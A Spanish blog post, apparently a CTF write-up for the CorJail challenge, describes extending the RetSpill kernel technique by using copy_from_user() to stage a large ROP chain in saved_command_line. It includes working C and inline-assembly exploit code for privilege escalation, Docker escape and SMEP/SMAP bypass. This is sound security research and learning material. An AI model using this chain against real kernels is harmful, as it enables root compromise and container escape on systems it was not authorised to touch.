Haciendo RetSpill Mas Potente

12 de July de 2026

TL;DR

RetSpill es una técnica de explotacion de Kernel en la que un atacante pasa de un Control Flow Hijack a, tradicionalmente, una ROP bastante limitada.

En este post hablare de como convertir esta ROP limitada en una ejecucion de codigo sin limites bypasseando SMEP y SMAP

Introducción

Estaba reforzando mis conocimientos de explotacion de kernel resolviendo retos de CTFs antiguos.

Me topé con CorJail, un reto en el que te aprovechas de un Off-By-Null en el Heap para llegar a un escape de Docker.

Mi approach fue bastante distinto que el del writeup original, usé la técnica PageJack overfloweando un Null-Byte en una estructura pipe_buffer para conseguir un UaF en una Página Física y despúes sobreescribir una estructura seq_operations para ganar Control Flow Hijack.

A partir de ahí pivotaría usando RetSpill, una técnica que había usado en retos anteriores para conseguir LPE.

El problema es que en este reto no solo necesito LPE, necesito escapar de un Docker. Eso significa que necesito una ROP Chain más grande de la que (a priori) puedo conseguir con RetSpill.

Recordando RetSpill

RetSpill se aprovecha de que el kernel escribe datos controlados desde Userland (como los registros antes de llamar a una syscall) en el Stack.

Si tenemos una primitiva de Control Flow Hijack podemos aprovechar un gadget de tipo add rsp+X; ret para pivotar a esta parte del Stack controlada por nosotros.

El problema es que al pivotar a la estructura pt_regs en el Stack (donde se guardan nuestros registros) solo podremos escribir 0x48 bytes (9 registros).

Para escapar de un Docker se me quedaba corto, ya que normalmente yo escribo mi Rop Chain en 8 registros volviendo a userland con la tecnica Telefork. Esta Rop Chain sería algo asi:

Haciendo RetSpill Mas Potente

El cuello de botella está claro: no tengo una primitiva de escritura lo suficientemente fuerte.

No puedo pivotar a una Rop Chain en userland porque SMAP está activado. Tampoco puedo redirigir la ejecucion a userland porque SMEP también está activado.

Me sentia como si le estuviera dando cabezazos a una pared…

Pensando en cómo el kernel accedia de manera legal a datos de userland, usando copy_from_user(), se me ocurrió una idea: ¿Y si hago que la ROP de RetSpill ejecute un copy_from_user() de mi ROP Real a una parte de la BSS, y después pivoto a ella?

Efectivamente, se podía hacer en 9 gadgets ;)

Manos a la Obra

Ahora solo queda elegir a que parte de la BSS copiar nuestra ROP Chain. Al principio pensé en modprobe_path, pero no era lo suficientemente grande para mi Rop Chain, llegaba un punto que sobreescribía otras estructuras críticas.

Investigando descubrí saved_command_line, una estructura en la BSS en la que se guarda la línea de comandos pasada al kernel en el arranque. Es la variable que lees a través /proc/cmdline. Es el candidato perfecto, la variable tiene un tamaño de 0x1000 bytes asi que puedes escribir una ROP Bastante grande.

Basicamente hacemos algo así:

1
2

copy_from_user(saved_command_line, our_buffer, size);
((void (*)(void))saved_command_line)();

void prepare_ropchain(ulong* ropbuf, ulong kern_addr){
  ulong user_rip = (ulong)get_shell;
  int i = 0;
  ropbuf[i++] = kern_addr+POP_RDI;
  ropbuf[i++] = kern_addr+INIT_CRED;
  ropbuf[i++] = kern_addr+COMMIT_CREDS;
 
  ropbuf[i++] = kern_addr+POP_RDI;
  ropbuf[i++] = 1;
  ropbuf[i++] = kern_addr+FIND_TASK_BY_VPID;
  ropbuf[i++] = kern_addr+POP_RDX_RET;
  ropbuf[i++] = 0;
  ropbuf[i++] = kern_addr+MOV_RCX_RAX;
  ropbuf[i++] = kern_addr+MOV_RDI_RCX_SUB_RDI_RDX;
  ropbuf[i++] = kern_addr+POP_RSI;
  ropbuf[i++] = kern_addr+INIT_NSPROXY;
  ropbuf[i++] = kern_addr+SWITCH_NAMESPACES;

  ropbuf[i++] = kern_addr+POP_RDI;
  ropbuf[i++] = kern_addr+INIT_FS;
  ropbuf[i++] = kern_addr+COPY_FS_STRUCT;
  ropbuf[i++] = kern_addr+PUSH_RAX_POP_RBX;
  ropbuf[i++] = kern_addr+POP_RDI;
  ropbuf[i++] = getpid();
  ropbuf[i++] = kern_addr+FIND_TASK_BY_VPID;
  ropbuf[i++] = kern_addr+POP_RSI;
  ropbuf[i++] = 0x6e0;
  ropbuf[i++] = kern_addr+ADD_RAX_RSI_RET;
  ropbuf[i++] = kern_addr+MOV_QWORD_PTR_RAX_RBX_POP_RBX;
  ropbuf[i++] = 0;


  ropbuf[i++] = kern_addr+KPTI_TRAMPOLINE;
  ropbuf[i++] = 0;
  ropbuf[i++] = 0;
  ropbuf[i++] = user_rip;
  ropbuf[i++] = user_cs;
  ropbuf[i++] = user_rflags;
  ropbuf[i++] = user_sp;
  ropbuf[i++] = user_ss;

}

ulong rbp_fake;
void trigger_retspill(int fd, ulong kern_addr){

  ulong ropbuf[33];
  prepare_ropchain(ropbuf, kern_addr);

  // OFFSET TO PT_REGS 0x160

  ulong r9 = kern_addr+ POP_RDI_POP_RSI_POP_RDX_POP_RCX_RET;
  ulong r10 = kern_addr+SAVED_COMMAND_LINE;
  ulong r11 = (ulong)ropbuf;
  ulong r12 = 288;
  rbp_fake = 0x5252525252525252;
  ulong rbx = kern_addr+POP_RCX_RET;
  // Some junk 0x8 data between rbx and r14
  ulong r14 = kern_addr+COPY_FROM_USER;
  ulong r15 = kern_addr+POP_RSP_RET;
  ulong r8 = kern_addr+SAVED_COMMAND_LINE;

  // NOT LOADED INTO PT_REGS
  ulong r13 = 0x4646464646464646;
  ulong rcx = 0x5050505050505050;

  
  char buf[8];
  __asm__ volatile(
      ".intel_syntax noprefix\n"
      "mov [rbp_fake], rbp\n"
      "mov rbp, 0x5252525252525252\n"
      "syscall\n"
      "mov rbp, [rbp_fake]\n"
      ".att_syntax prefix"
      : "+r"(r8), "+r"(r9),"+r"(r10),"+r"(r11),"+r"(r12),"+r"(r13),"+r"(r14),"+r"(r15),
        "+b"(rbx), "+c"(rcx)
      : "D"(fd), "S"(buf), "d"(8), "a"(0)
      : "memory"
      );
}

Conclusión

Con esta tecnica pasamos de tener un único Control Flow Hijack a tener una primitiva de escritura arbitraria y ejecución de codigo arbitrario.

Esto abre muchas puertas en la explotacion de Kernel, ya que conseguimos una primitiva muy potente con un único control de RIP bypasseando SMEP y SMAP.

(Nota: Se necesita leak de KASLR)
